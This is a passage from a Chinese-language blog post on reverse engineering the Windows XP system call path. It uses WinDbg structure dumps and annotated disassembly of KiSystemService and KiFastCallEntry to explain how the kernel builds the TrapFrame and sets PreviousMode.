DpcStack         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x86c</span> DpcCount         : Uint4B</span><br><span class="line">   +<span class="number">0x870</span> DpcQueueDepth    : Uint4B</span><br><span class="line">   +<span class="number">0x874</span> DpcRoutineActive : Uint4B</span><br><span class="line">   +<span class="number">0x878</span> DpcInterruptRequested : Uint4B</span><br><span class="line">   +<span class="number">0x87c</span> DpcLastCount     : Uint4B</span><br><span class="line">   +<span class="number">0x880</span> DpcRequestRate   : Uint4B</span><br><span class="line">   +<span class="number">0x884</span> MaximumDpcQueueDepth : Uint4B</span><br><span class="line">   +<span class="number">0x888</span> MinimumDpcRate   : Uint4B</span><br><span class="line">   +<span class="number">0x88c</span> QuantumEnd       : Uint4B</span><br><span class="line">   +<span class="number">0x890</span> PrcbPad5         : [<span class="number">16</span>] UChar</span><br><span class="line">   +<span class="number">0x8a0</span> DpcLock          : Uint4B</span><br><span class="line">   +<span class="number">0x8a4</span> PrcbPad6         : [<span class="number">28</span>] UChar</span><br><span class="line">   +<span class="number">0x8c0</span> CallDpc          : _KDPC</span><br><span class="line">   +<span class="number">0x8e0</span> ChainedInterruptList : Ptr32 Void</span><br><span class="line">   +<span class="number">0x8e4</span> LookasideIrpFloat : Int4B</span><br><span class="line">   +<span class="number">0x8e8</span> SpareFields0     : [<span class="number">6</span>] Uint4B</span><br><span class="line">   +<span class="number">0x900</span> VendorString     : [<span class="number">13</span>] UChar</span><br><span class="line">   +<span class="number">0x90d</span> InitialApicId    : UChar</span><br><span class="line">   +<span class="number">0x90e</span> LogicalProcessorsPerPhysicalProcessor : UChar</span><br><span class="line">   +<span class="number">0x910</span> MHz              : Uint4B</span><br><span class="line">   +<span class="number">0x914</span> FeatureBits      : Uint4B</span><br><span class="line">   +<span class="number">0x918</span> UpdateSignature  : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x920</span> NpxSaveArea      : _FX_SAVE_AREA</span><br><span class="line">   +<span class="number">0xb30</span> PowerState       : _PROCESSOR_POWER_STATE</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看KPRCB地址（<strong>KiProcessorBlock</strong>），这里是单核，所以只有一个值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock  L2</span><br><span class="line"><span class="number">8055</span>d5a0  ffdff120 <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p><code>ffdff120</code>这个地址减去0x120就是KPCR的地址。</p>
</li>
<li><p>查看CPU数量（<strong>KeNumberProcessors</strong> ）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors</span><br><span class="line"><span class="number">80556</span>a60  <span class="number">00000001</span> <span class="number">00000006</span> <span class="number">00008e0</span>a a0013fff</span><br><span class="line"><span class="number">80556</span>a70  <span class="number">806</span>ceec0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000061</span></span><br><span class="line"><span class="number">80556</span>a80  <span class="number">8003f</span>0e0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>接着分析<code>KiSystemService</code>函数代码：</p>
<p><img data-src="https://s2.loli.net/2022/02/19/TdAGBr9ma7QPqtW.png" alt="15.png"></p>
<p><img data-src="https://s2.loli.net/2022/02/19/8iAfJNKYGmswdIC.png" alt="14.png"></p>
<p>这里的<code>FS:124</code>为_KPRCB的第3个成员CurrentThread，是当前CPU所执行线程的<code>_ETHREAD</code>。<code>_ETHREAD</code>部分成员如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +<span class="number">0x000</span> Tcb              : _KTHREAD</span><br><span class="line">   +<span class="number">0x1c0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1c0</span> NestedFaultCount : Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x1c0</span> ApcNeeded        : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x1c8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1c8</span> LpcReplyChain    : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x1c8</span> KeyedWaitChain   : _LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>第一个成员为<code>_KTHREAD    </code>，<code>_KTHREAD    </code>部分成员如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> InitialStack     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> Teb              : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> DebugActive      : UChar</span><br><span class="line">   +<span class="number">0x02d</span> State            : UChar</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x0e0</span> ServiceTable     : Ptr32 Void	<span class="comment">//SystemServiceTable系统服务表SST</span></span><br><span class="line">   +<span class="number">0x0e4</span> Queue            : Ptr32 _KQUEUE</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x138</span> ApcStatePointer  : [<span class="number">2</span>] Ptr32 _KAPC_STATE</span><br><span class="line">   +<span class="number">0x140</span> PreviousMode     : Char</span><br><span class="line">   +<span class="number">0x141</span> EnableStackSwap  : UChar</span><br><span class="line">   +<span class="number">0x142</span> LargeStack       : UChar</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/02/19/VNvG3MpILz8oSm7.png" alt="16.png"></p>
<p><img data-src="https://s2.loli.net/2022/02/19/oXJMatg9FZr1Pwk.png" alt="17.png"></p>
<p>0FFDFF124h+140h就是<code>PreviousMode</code>，意为先前模式。</p>
<p>保存老的先前模式，因为一段代码如果是0环执行和3环执行是不一样的，记录调用这段代码之前是0环的还是3环的。</p>
<p>接着分析代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub     esp, <span class="number">48</span>h</span><br></pre></td></tr></table></figure>

<p>将esp指向<code>_Trap_Frame</code>的起始位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov    ebx, [esp+<span class="number">68</span>h+arg_0]</span><br><span class="line"><span class="keyword">and</span>     ebx, <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这里arg_0是4</p>
<p>那么就是将esp+6c位置上的值赋给ebx，并与上1。esp+6c位置就是cs的值，主要是为了判断权限的问题，如果是3环来的，cs的值是11，如果是0环来的，cs的值是8。所以与后如果是0，那么就是0环来的，如果是1，那么就是3环来的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [esi+<span class="number">140</span>h], bl</span><br></pre></td></tr></table></figure>

<p>esi是KTHREAD，esi+140偏移的地方正好是先前模式，将值赋给先前模式，“新的先前模式”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebp, esp</span><br></pre></td></tr></table></figure>

<p>esp和ebp此时都指向Trap_Frame的首地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [esi+<span class="number">134</span>h]</span><br></pre></td></tr></table></figure>

<p>esi+134h是KTHREAD+134h偏移又是TrapFrame，这里也可以验证TrapFrame结构体实际上是一个线程一份，因为在KTHREAD这个线程结构体中有一份，而KTHREAD是每个线程一份。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">3</span>Ch], ebx</span><br><span class="line">mov     [esi+<span class="number">134</span>h], ebp</span><br></pre></td></tr></table></figure>

<p>将老的TrapFrame的值存在一个位置上，然后将新的TrapFrame放到esi+134h这个位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [ebp+<span class="number">60</span>h]</span><br><span class="line">mov     edi, [ebp+<span class="number">68</span>h]</span><br></pre></td></tr></table></figure>

<p>将原来三环的ebp放到ebx里，将三环eip放到了edi中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>Ch], edx</span><br></pre></td></tr></table></figure>

<p>进0环的时候，edx保存的是参数的地址，这里赋值给TrapFrame+0Ch偏移正好是<code>DbgArgPointer</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>], ebx</span><br><span class="line">mov     [ebp+<span class="number">4</span>], edi</span><br></pre></td></tr></table></figure>

<p>TrapFrame+0h 和TrapFrame+4h分别是DbgEbp和DbgEip。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">0F</span>Fh</span><br></pre></td></tr></table></figure>

<p>判断是否处于调试状态（DebugActive），如果是处于调试状态，才会把cr0-cr7存到TrapFrame结构体中，如果没处于调试状态就不存cr0-cr7的值。那么就是将esp+6c位置上的值赋给ebx，并与上1。esp+6c位置就是cs的值，主要是为了判断权限的问题，如果是3环来的，cs的值是11，如果是0环来的，cs的值是8。所以与后如果是0，那么就是0环来的，如果是1，那么就是3环来的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [esi+<span class="number">140</span>h], bl</span><br></pre></td></tr></table></figure>

<p>esi是KTHREAD，esi+140偏移的地方正好是先前模式，将值赋给先前模式，“新的先前模式”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebp, esp</span><br></pre></td></tr></table></figure>

<p>esp和ebp此时都指向Trap_Frame的首地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [esi+<span class="number">134</span>h]</span><br></pre></td></tr></table></figure>

<p>esi+134h是KTHREAD+134h偏移又是TrapFrame，这里也可以验证TrapFrame结构体实际上是一个线程一份，因为在KTHREAD这个线程结构体中有一份，而KTHREAD是每个线程一份。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">3</span>Ch], ebx</span><br><span class="line">mov     [esi+<span class="number">134</span>h], ebp</span><br></pre></td></tr></table></figure>

<p>将老的TrapFrame的值存在一个位置上，然后将新的TrapFrame放到esi+134h这个位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [ebp+<span class="number">60</span>h]</span><br><span class="line">mov     edi, [ebp+<span class="number">68</span>h]</span><br></pre></td></tr></table></figure>

<p>将原来三环的ebp放到ebx里，将三环eip放到了edi中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>Ch], edx</span><br></pre></td></tr></table></figure>

<p>进0环的时候，edx保存的是参数的地址，这里赋值给TrapFrame+0Ch偏移正好是<code>DbgArgPointer</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>], ebx</span><br><span class="line">mov     [ebp+<span class="number">4</span>], edi</span><br></pre></td></tr></table></figure>

<p>TrapFrame+0h 和TrapFrame+4h分别是DbgEbp和DbgEip。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">0F</span>Fh</span><br></pre></td></tr></table></figure>

<p>判断是否处于调试状态（DebugActive），如果是处于调试状态（<code>DebugActive != 0xFF</code>），才会把Dr0-Dr7存到TrapFrame结构体中，如果没处于调试状态就不存Dr0-Dcr7的值。</p>
<div class="note default"><p>通过对函数<code>KiSystemService</code>的分析，已经知道如下的问题一和问题三。原来的寄存器存储到了 _Trap_Frame 结构体里，3环API参数指针通过EDX传给0环。</p>
<ol>
<li>进0环后，原来的寄存器存在哪里？</li>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
<li>2种调用方式是如何返回到3环的？</li>
</ol>
</div>

<h3 id="4-4-完整分析KiSystemService"><a href="#4-4-完整分析KiSystemService" class="headerlink" title="4.4 完整分析KiSystemService"></a>4.4 完整分析KiSystemService</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A451 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451 _KiSystemService proc near              ; CODE XREF: ZwAcceptConnectPort(x,x,x,x,x,x)+C↑p</span><br><span class="line">.text:<span class="number">0046</span>A451                                         ; ZwAccessCheck(x,x,x,x,x,x,x,x)+C↑p ...</span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451 arg_0           = dword ptr  <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451                 push    <span class="number">0</span>	<span class="comment">//PUSH Errode，错误码初始化为0</span></span><br><span class="line">.text:<span class="number">0046</span>A453                 push    ebp	<span class="comment">//保存3环寄存器的值</span></span><br><span class="line">.text:<span class="number">0046</span>A454                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A455                 push    esi</span><br><span class="line">.text:<span class="number">0046</span>A456                 push    edi</span><br><span class="line">.text:<span class="number">0046</span>A457                 push    fs</span><br><span class="line">.text:<span class="number">0046</span>A459                 mov     ebx, <span class="number">30</span>h	<span class="comment">//使用段选择子0x30对应的段描述符来更新FS段寄存器FS的值</span></span><br><span class="line">.text:<span class="number">0046</span>A45E                 mov     fs, bx	<span class="comment">//查GDT表得ffc093df`f0000001(0环数据段,RPL == 0)</span></span><br><span class="line">.text:<span class="number">0046</span>A461                 assume fs:nothing<span class="comment">//fs.base = ffdff000，指向当前CPU的KPCR结构</span></span><br><span class="line">.text:<span class="number">0046</span>A461                 push    large dword ptr fs:<span class="number">0</span>	<span class="comment">//保存旧的 ExceptionList，然后把新的清成-1</span></span><br><span class="line">.text:<span class="number">0046</span>A468                 mov     large dword ptr fs:<span class="number">0</span>, <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.text:<span class="number">0046</span>A473                 mov     esi, large fs:<span class="number">124</span>h	<span class="comment">//esi = _KTHREAD结构</span></span><br><span class="line">.text:<span class="number">0046</span>A47A                 push    dword ptr [esi+<span class="number">140</span>h]	<span class="comment">//_KTHREAD+0x40 == PreviousMode压栈</span></span><br><span class="line">.text:<span class="number">0046</span>A480                 sub     esp, <span class="number">48</span>h			<span class="comment">//此时esp指向偏移0x48处，然后将其提升使其指向_TrapFrame首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A483                 mov     ebx, [esp+<span class="number">68</span>h+arg_0]	<span class="comment">//arg_0==4，ebx = CS3</span></span><br><span class="line">.text:<span class="number">0046</span>A487                 <span class="keyword">and</span>     ebx, <span class="number">1</span>			<span class="comment">//CS3 &amp; 0x1</span></span><br><span class="line">.text:<span class="number">0046</span>A48A                 mov     [esi+<span class="number">140</span>h], bl		<span class="comment">//将CS3填充至先前模式PreviousMode</span></span><br><span class="line">.text:<span class="number">0046</span>A490                 mov     ebp, esp			<span class="comment">//ebp = esp = _TrapFrame首地</span></span><br><span class="line">.text:<span class="number">0046</span>A492                 mov     ebx, [esi+<span class="number">134</span>h]		<span class="comment">//ebp = _KTHREAD+0x134 = _TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A498                 mov     [ebp+<span class="number">3</span>Ch], ebx		<span class="comment">//_KTRAP_FRAME.Edx = ebp+3Ch，指向旧的 CurrentThread.TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A49B                 mov     [esi+<span class="number">134</span>h], ebp		<span class="comment">//CurrentThread.TrapFrame 指向当前 _KTRAP_FRAME</span></span><br><span class="line">.text:<span class="number">0046</span>A4A1                 cld				<span class="comment">//df = 0</span></span><br><span class="line">.text:<span class="number">0046</span>A4A2                 mov     ebx, [ebp+<span class="number">60</span>h]		<span class="comment">//ebx = ebp3</span></span><br><span class="line">.text:<span class="number">0046</span>A4A5                 mov     edi, [ebp+<span class="number">68</span>h]		<span class="comment">//edi = eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A4A8                 mov     [ebp+<span class="number">0</span>Ch], edx		<span class="comment">//_KTRAP_FRAME.DbgArgPointer = edx，保存3环API参数指针</span></span><br><span class="line">.text:<span class="number">0046</span>A4AB                 mov     dword ptr [ebp+<span class="number">8</span>], <span class="number">0B</span>ADB0D00h <span class="comment">//目前不清楚具体意思</span></span><br><span class="line">.text:<span class="number">0046</span>A4B2                 mov     [ebp+<span class="number">0</span>], ebx		<span class="comment">//_KTRAP_FRAME.DbgEbp = ebp3</span></span><br><span class="line">.text:<span class="number">0046</span>A4B5                 mov     [ebp+<span class="number">4</span>], edi		<span class="comment">//_KTRAP_FRAME.DbgEip = eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A4B8                 test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">0F</span>Fh	<span class="comment">//_KTHREAD+0x2C = DebugActive，判断是否处于调试状态</span></span><br><span class="line">.text:<span class="number">0046</span>A4BC                 jnz     Dr_kss_a			<span class="comment">//如果是处于调试状态，才会把cr0-cr7存到TrapFrame结构体中</span></span><br><span class="line">  								<span class="comment">//如果没处于调试状态就不存cr0-cr7的值</span></span><br><span class="line">.text:<span class="number">0046</span>A4C2</span><br><span class="line">.text:<span class="number">0046</span>A4C2 loc_46A4C2:                             ; CODE XREF: Dr_kss_a+<span class="number">10</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A4C2                                         ; Dr_kss_a+<span class="number">7</span>C↑j</span><br><span class="line">.text:<span class="number">0046</span>A4C2                 sti				<span class="comment">//允许中断</span></span><br><span class="line">.text:<span class="number">0046</span>A4C3                 jmp     loc_46A5AF</span><br><span class="line">.text:<span class="number">0046</span>A4C3 _KiSystemService endp</span><br></pre></td></tr></table></figure>



<h2 id="5-完整分析KiFastCallEntry"><a href="#5-完整分析KiFastCallEntry" class="headerlink" title="5 完整分析KiFastCallEntry"></a>5 完整分析KiFastCallEntry</h2><div class="note danger"><p>从3环<strong>KiFastSystemCall</strong>通过<code>sysenter</code>进入0环后，会调用函数<strong>KiFastCallEntry</strong>，其中CS0、EIP、SS0 &#x3D; CS0 + 8从MSR寄存器中来，<strong>ESP0从TSS中获取</strong>。</p>
<p>与中断门进入0环后调用KiSystemService函数中前部分是不太一样，快速调用进来0环的SS3、ESP3、EFLAG3、CS3、EIP3由操作系统来压栈（中断门进入由CPU自己压栈）。</p>
<p><strong>KiFastCallEntry</strong>也需要将<code>_KTRAP_FRAME</code>结构填满。</p>
</div>

<h3 id="5-1-进入0环前的堆栈与寄存器"><a href="#5-1-进入0环前的堆栈与寄存器" class="headerlink" title="5.1 进入0环前的堆栈与寄存器"></a>5.1 进入0环前的堆栈与寄存器</h3><p>通过正常的系统调用从3环进入0环都会从<code>Ntdll.dll</code>里面的函数调用<code>KiFastSystemCall</code>进去R0。</p>
<p>那么这里就来分析一下，一个 API 函数在调用<code>Ntdll.dll</code>前都会做一些什么工作？这里以<code>Kernel32.dll</code>中的函数<code>ReadProcessMemory</code>来进行举例说明。</p>
<p>函数<code>ReadProcessMemory</code>进入0环前，在<mark class="label primary">3环</mark>的<strong>堆栈</strong>以及<strong>寄存器</strong>的值如下：</p>
<p><img data-src="https://s2.loli.net/2022/07/12/gAyx1mZJGhSHn7z.png" alt="50.png"></p>
<p>这里查看一下<code>IA32_SYSENTER_EIP</code>是到0环的哪个地方执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; rdmsr <span class="number">176</span></span><br><span class="line">msr[<span class="number">176</span>] = <span class="number">00000000</span>`<span class="number">80542520</span>	<span class="comment">//查看EIP</span></span><br><span class="line">  </span><br><span class="line">kd&gt; u <span class="number">80542520</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line"><span class="number">80542520</span> b923000000      mov     ecx,<span class="number">23</span>h</span><br><span class="line"><span class="number">80542525</span> <span class="number">6</span>a30            push    <span class="number">30</span>h</span><br><span class="line"><span class="number">80542527</span> <span class="number">0f</span>a1            pop     fs</span><br><span class="line"><span class="number">80542529</span> <span class="number">8</span>ed9            mov     ds,cx</span><br><span class="line"><span class="number">8054252b</span> <span class="number">8</span>ec1            mov     es,cx</span><br><span class="line"><span class="number">8054252</span>d <span class="number">648b</span>0d40000000  mov     ecx,dword ptr fs:[<span class="number">40</span>h]</span><br><span class="line"><span class="number">80542534</span> <span class="number">8b</span>6104          mov     esp,dword ptr [ecx+<span class="number">4</span>]</span><br><span class="line"><span class="number">80542537</span> <span class="number">6</span>a23            push    <span class="number">23</span>h</span><br></pre></td></tr></table></figure>

<p>可以看到是0环的<code>KiFastCallEntry</code>函数。</p>
<h3 id="5-2-KiFastCallEntry函数分析"><a href="#5-2-KiFastCallEntry函数分析" class="headerlink" title="5.2 KiFastCallEntry函数分析"></a>5.2 KiFastCallEntry函数分析</h3><div class="note danger"><p><strong>注意事项</strong>：</p>
<ol>
<li><p>快速调用进入0环后，CPU<strong>并不会像中断门调用进入0环那样自动将寄存器SS、ESP3、Eflags3、CS、EIP3压入0环堆栈</strong>（TrapFrame）。</p>
</li>
<li><p>进入0环时，<strong>edx 寄存器并非直接指向3环 API 的参数</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add edx, <span class="number">8</span> <span class="comment">//此时edx指向3环API参数。这也说明在3环时edx+8才指向API的参数</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>int 0x2e</code>进入0环后，当<code>TrapFrame</code>的成员<strong>都初始化完成后</strong>，会在函数<code>_KiSystemService</code>中会设置<code>KTRAP_FRAME._Edx = Currentthread-&gt;TrapFrame</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A473                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">0046</span>A492                 mov     ebx, [esi+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0046</span>A498                 mov     [ebp+_KTRAP_FRAME._Edx], ebx</span><br></pre></td></tr></table></figure>

<p>但是在<code>KiFastCallEntry</code>中并没有发现会将当前线程的<code>TrapFrame</code>保存起来。</p>
<p><strong>但是</strong>：在函数<code>KiFastCallEntry</code>、<code>NtRaiseException</code>等这些函数中都会有如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A625                 mov     edx, [ebp+_KTRAP_FRAME._Edx] </span><br><span class="line">.text:<span class="number">0046</span>A628                 mov     [ecx+_KTHREAD.TrapFrame], edx</span><br></pre></td></tr></table></figure>

<p>用来恢复<code>TrapFrame</code>。尽管在<code>KiFastCallEntry</code>没有看到使用<code>KTRAP_FRAME._Edx</code>保存<code>TrapFrame</code>，但是从其他函数逆向分析来看，**“假装”<code>KiFastCallEntry</code>函数会像函数<code>_KiSystemService</code>中一样设置<code>KTRAP_FRAME._Edx = Currentthread-&gt;TrapFrame</code>**。</p>
</li>
</ol>
</div>

<ol>
<li>先处理段寄存器<ul>
<li>FS &#x3D; 0x30</li>
<li>DS &#x3D; 0x23</li>
<li>ES &#x3D; 0x23</li>
</ul>
</li>
<li><code>esp0 = TSS.ESP0</code>，找到当前线程的栈顶</li>
</ol>
<p>进入系统服务函数之前，<code>KiFastCallEntry</code>堆栈与寄存器图：</p>
<p><img data-src="https://s2.loli.net/2022/07/12/Bhqnk1LGlAMov8m.png" alt="51.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// 从3环函数 KiFastSystemCall 的 sysenter 指令调用</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// edx = esp3, eax = 0xIndex</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 _KiFastCallEntry proc near              <span class="comment">// DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24↑o</span></span><br><span class="line">.text:<span class="number">0046</span>A520                                         <span class="comment">// _KiTrap01+74↓o</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 var_B           = byte ptr <span class="number">-0B</span>h</span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// FUNCTION CHUNK AT .text:0046A4ED SIZE 00000026 BYTES</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// FUNCTION CHUNK AT .text:0046A7C0 SIZE 00000014 BYTES</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520                 mov     ecx, <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0046</span>A525                 push    <span class="number">30</span>h             <span class="comment">// 开始修改段寄存器为0环的值</span></span><br><span class="line">.text:<span class="number">0046</span>A527                 pop     fs              <span class="comment">// fs = 0x30，查GDT表得ffc093df`f0000001(0环数据段,RPL == 0)</span></span><br><span class="line">.text:<span class="number">0046</span>A529                 mov     ds, ecx         <span class="comment">// ds = 0x23，00cffb00`0000ffff(3环数据段,RPL == 3    )</span></span><br><span class="line">.text:<span class="number">0046</span>A52B                 mov     es, ecx         <span class="comment">// es = 0x23</span></span><br><span class="line">.text:<span class="number">0046</span>A52D                 mov     ecx, large fs:_KPCR.TSS</span><br><span class="line">.text:<span class="number">0046</span>A534                 mov     esp, [ecx+<span class="number">4</span>]    <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// esp = TSS.esp0，切换到0环堆栈</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// TSS.esp0 指向当前线程 TrapFrame 0x7C V86ES</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// 从这里可以知道 KiFastEntry 的函数堆栈即为当前线程的 TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// 下面开始从 HardwareSegss 开始填充 TrapFrame （当前函数堆栈）</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A537                 push    <span class="number">23</span>h             <span class="comment">// HardwareSegSs = 0x23</span></span><br><span class="line">.text:<span class="number">0046</span>A539                 push    edx             <span class="comment">// HardwareSegEsp = esp3 == 3环的第二个返回地址</span></span><br><span class="line">.text:<span class="number">0046</span>A53A                 pushf</span><br><span class="line">.text:<span class="number">0046</span>A53B</span><br><span class="line">.text:<span class="number">0046</span>A53B loc_46A53B:                             <span class="comment">// CODE XREF: _KiFastCallEntry2+23↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A53B                 push    <span class="number">2</span></span><br><span class="line">.text:<span class="number">0046</span>A53D                 add     edx, <span class="number">8</span>          <span class="comment">// 此时 edx 指向 3 环的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A540                 popf                    <span class="comment">// EFlags = 0x02，即清空0环所有标志位</span></span><br><span class="line">.text:<span class="number">0046</span>A541                 <span class="keyword">or</span>      [esp+<span class="number">0</span>Ch+var_B], <span class="number">2</span> <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// 此时esp 指向 KTRAP_FRAME.EFlags</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// eflag(8~15bit)</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// 将3环 EFlags 的 IF = 1,以响应接受可屏蔽中断</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A546                 push    <span class="number">1B</span>h             <span class="comment">// KTRAP_FRAME.SegCs = 0x1B = CS3</span></span><br><span class="line">.text:<span class="number">0046</span>A548                 push    dword ptr ds:<span class="number">0F</span>FDF0304h <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">// KTRAP_FRAME.Eip = _KUSER_SHARED_DATA.SystemCallReturn返回地址</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">// 也就是说从 0 环返回 3 环时将会返回到这个函数</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A54E                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A550                 push    ebp</span><br><span class="line">.text:<span class="number">0046</span>A551                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A552                 push    esi</span><br><span class="line">.text:<span class="number">0046</span>A553                 push    edi</span><br><span class="line">.text:<span class="number">0046</span>A554                 mov     ebx, large fs:_KPCR.SelfPcr</span><br><span class="line">.text:<span class="number">0046</span>A55B                 push    <span class="number">3B</span>h             <span class="comment">// 